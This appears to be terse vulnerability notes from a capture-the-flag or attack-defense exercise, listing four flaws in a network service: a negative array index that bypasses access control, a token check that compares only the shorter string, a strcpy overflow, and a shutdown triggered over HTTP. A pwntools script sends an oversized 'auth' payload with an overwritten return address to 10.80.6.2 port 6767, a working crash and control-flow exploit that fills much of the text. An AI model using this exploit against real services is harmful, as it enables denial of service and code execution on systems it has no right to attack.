1. Negative index ("-1") of array lacks access control
2. Auth token is compared by least lengthy string (my_strcmp)
3. PWN `strcpy` (easy DoS crash, ROP)

```python
from pwn import *

conn = remote('10.80.6.2', 6767)
conn.sendline(b"auth " + b'A'*(256+8) + p64(0x405967))
print(conn.recv().decode())
conn.close()
```
4. Binary shutdown via http endpoint 
